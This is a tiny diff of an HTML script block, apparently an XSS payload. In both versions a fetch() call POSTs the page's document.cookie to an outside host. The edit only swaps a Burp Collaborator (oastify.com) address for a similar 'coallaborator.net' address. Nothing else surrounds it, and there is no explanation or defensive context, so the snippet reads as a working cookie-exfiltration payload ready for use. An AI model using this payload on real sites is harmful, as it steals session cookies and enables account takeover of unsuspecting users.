@@ -1,5 +1,5 @@
 <script>
-  fetch('https://sqmtgvsukaldb5mgxmki1eq5uw0nofc4.oastify.com', {
+  fetch('https://3pt4f6r5jlkoaglrwxjt0ppgt7zznpbe.coallaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
